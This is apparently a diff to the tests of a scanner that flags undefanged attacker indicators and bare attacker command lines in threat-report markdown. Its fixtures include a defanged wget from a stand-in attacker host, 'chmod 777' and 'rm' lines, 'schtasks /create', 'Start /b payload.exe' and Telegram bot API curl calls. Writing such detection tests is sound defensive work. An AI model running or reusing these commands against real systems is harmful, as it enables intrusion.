@@ -70,10 +70,14 @@ test('commands with no network indicator are still attacker command blocks (the 
   assert.deepStrictEqual(scan(doc('schtasks /create /tn x /tr y').replace('schtasks', '[s]chtasks')).f, []);
 });
 
-test('a block with a bracketed token passes; command-like lines still bare in it are counted as a NOTE, not a finding', function () {
+test('every executable line of a command block carries its own bracket: bare lines in a partly bracketed block are findings (review, decision 3)', function () {
   var r = scan(doc('[w]get hxxp://evil[.]example-attacker[.]com/a\nchmod 777 a\nrm a'));
-  assert.deepStrictEqual(r.f, []);
-  assert.strictEqual(r.st.cmdLinesUnbracketedInBracketedBlocks, 2);
+  assert.deepStrictEqual(kinds(r), ['ATTACKER-COMMAND-LINE', 'ATTACKER-COMMAND-LINE']);
+  assert.deepStrictEqual(r.f.map(function (x) { return x.line; }), [7, 8], 'the finding names the bare line, not the fence');
+  assert.strictEqual(r.st.cmdLinesBare, 2);
+  assert.deepStrictEqual(scan(doc('[w]get hxxp://evil[.]example-attacker[.]com/a\n[c]hmod 777 a\n[r]m a')).f, []);
+  // an option line indented under its command is an argument, not a command; a `\` continuation likewise
+  assert.deepStrictEqual(scan(doc('[s]chtasks /create\n  /tn x\n  /sc once\n[c]url -o a \\\n  b')).f, []);
 });
 
 test('ordinary words and data blocks are not commands: a log table, structured data, comments', function () {
@@ -84,7 +88,7 @@ test('ordinary words and data blocks are not commands: a log table, structured d
   assert.deepStrictEqual(kinds(scan(doc('Start /b payload.exe'))), ['ATTACKER-COMMAND-BLOCK']);
 });
 
-test('prose, inline code, tables and lists: raw indicators flagged, defanged, private and link targets not', function () {
+test('prose, inline code, tables and lists: raw indicators flagged, defanged and private not; link targets are scanned like text, asset paths are not', function () {
   var md = [
     'The operator used 198.51.100.17 and `198.51.100.18:8080` and host evil.example-attacker.com.',
     '',
@@ -100,7 +104,9 @@ test('prose, inline code, tables and lists: raw indicators flagged, defanged, pr
     'A version 10.0.19041.1 and a build 6.1.7601.17514 are not addresses.'
   ].join('\n');
   var r = scan(md);
-  assert.deepStrictEqual(kinds(r), ['DOMAIN', 'EMAIL', 'IPV4', 'IPV4', 'IPV4']);
+  assert.deepStrictEqual(kinds(r), ['DOMAIN', 'EMAIL', 'IPV4', 'IPV4', 'IPV4', 'URL', 'URL', 'URL']);
+  assert.strictEqual(r.f.filter(function (x) { return x.ctx === 'link-target'; }).length, 3, 'inline link, href attribute and reference definition');
+  assert.strictEqual(r.st.linkTargetsNoHost, 1, 'the asset path has no host');
   assert.strictEqual(r.st.matchedPrivate, 5, 'four private addresses plus the netmask');
   assert.ok(r.st.matchedDefanged >= 3);
 });
@@ -110,7 +116,7 @@ test('a partly defanged host is a finding: the canonical form defangs every dot'
   assert.deepStrictEqual(kinds(scan('mail ops@evil[.]example-attacker[.]com\n')), ['EMAIL']);
 });
 
-test('the allow list suppresses and COUNTS: nothing is silent, and a domain entry covers its subdomains', function () {
+test('the allow list suppresses and COUNTS: nothing is silent, and an entry covers its own host only, never a subdomain', function () {
   var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-allow-'));
   try {
     var f = path.join(tmp, 'allow.txt');
@@ -118,9 +124,9 @@ test('the allow list suppresses and COUNTS: nothing is silent, and a domain entr
     var a = L.makeAllow([f]);
     var st = L.newStats();
     var found = L.scanFile('see docs.vendor.example-attacker.com and 198.51.100.99 and 198.51.100.98 and https://vendor.example-attacker.com/x\n', 't.md', a, st);
-    assert.deepStrictEqual(found.map(function (x) { return x.kind; }), ['IPV4']);
-    assert.strictEqual(st.matchedAllowed, 3);
-    assert.strictEqual(st.allowedBy['vendor.example-attacker.com'], 2);
+    assert.deepStrictEqual(found.map(function (x) { return x.kind; }).sort(), ['DOMAIN', 'IPV4']);
+    assert.strictEqual(st.matchedAllowed, 2);
+    assert.strictEqual(st.allowedBy['vendor.example-attacker.com'], 1);
     // the built-in list holds no hosting, code, paste or storage service
     assert.deepStrictEqual(kinds(scan('see https://github.com/x/y and https://pastebin.com/abc and https://cdn.discordapp.com/a\n')), ['URL', 'URL', 'URL']);
   } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
@@ -303,7 +309,7 @@ test('block exception: excuses exactly the named block (counted), never the othe
     assert.match(stale.stdout, /STALE-BLOCK-EXCEPTION/);
     var other = run('block other.md | Operator VPS  # wrong file\n');
     assert.match(other.stdout, /ATTACKER-COMMAND-BLOCK 2/);
-    assert.doesNotMatch(other.stdout, /STALE-BLOCK-EXCEPTION/, 'an exception for a file that was not read is not stale');
+    assert.match(other.stdout, /STALE-BLOCK-EXCEPTION.*names a file that does not exist/, 'an exception for a file that is not there is stale (review, decision 5)');
     // too broad: one exception matching two blocks FAILs
     fs.writeFileSync(path.join(rep, 'index.md'), BLOCK_DOC + '\n```\nOperator VPS (198[.]51[.]100[.]17) again\nSSH keys: b\n```\n');
     var broad = run('block index.md | Operator VPS  # too short a prefix\nblock index.md | wget hxxp  # ok\n');
@@ -354,7 +360,7 @@ test('allow guard: a bare public suffix or TLD entry FAILs and is not applied; t
       assert.match(r.stdout, /FINDING .*DOMAIN/, 'the host under the suffix is still flagged for ' + entry);
     });
     // control: a specific host entry is fine and the bare mention ".co.uk" is not a finding by itself
-    fs.writeFileSync(path.join(dir, 'rep.txt'), 'inklens.co.uk  # test: allowed on purpose\nexample-attacker.com  # test\n');
+    fs.writeFileSync(path.join(dir, 'rep.txt'), 'inklens.co.uk  # test: allowed on purpose\nfi1.inklens.co.uk  # test: a subdomain is listed itself\nevil.example-attacker.com  # test\n');
     var ok = cli([rep, '--allow-dir', dir]);
     assert.strictEqual(ok.status, 0, ok.stdout);
     assert.match(ok.stdout, /bare public suffix/);
@@ -370,7 +376,7 @@ test('allow guard: a bare public suffix or TLD entry FAILs and is not applied; t
 
 test('bot id guard: an allowed host does not pass a path with a real bot id; the <token> placeholder does; the finding never prints the id', function () {
   var a = L.makeAllow([]);
-  a.entries.push('api.telegram.org');
+  a = L.makeAllow([{ name: 't', text: 'api.telegram.org/bot*  # Bot API named as the service\n' }]);
   function f(line) { var st = L.newStats(); return L.scanFile(line + '\n', 't.md', a, st).map(function (x) { return x.kind + ' ' + x.token; }); }
   assert.deepStrictEqual(f('curl https://api.telegram.org/bot<token>/sendMessage'), []);
   assert.deepStrictEqual(f('curl https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'), []);
@@ -382,7 +388,7 @@ test('bot id guard: an allowed host does not pass a path with a real bot id; the
   withTmp(function (tmp) {
     var dir = path.join(tmp, 'defang-allow'); fs.mkdirSync(dir);
     var rep = path.join(tmp, 'rep'); fs.mkdirSync(rep);
-    fs.writeFileSync(path.join(dir, 'rep.txt'), 'api.telegram.org  # Telegram Bot API named as the service\n');
+    fs.writeFileSync(path.join(dir, 'rep.txt'), 'api.telegram.org/bot*  # Telegram Bot API named as the service\n');
     fs.writeFileSync(path.join(rep, 'index.md'), '# t\n\nPlaceholder https://api.telegram.org/bot<token>/getMe is fine.\n');
     assert.strictEqual(cli([rep, '--allow-dir', dir]).status, 0);
     fs.writeFileSync(path.join(rep, 'index.md'), '# t\n\nReal https://api.telegram.org/bot8123456789:AAF-example/getMe is not.\n');
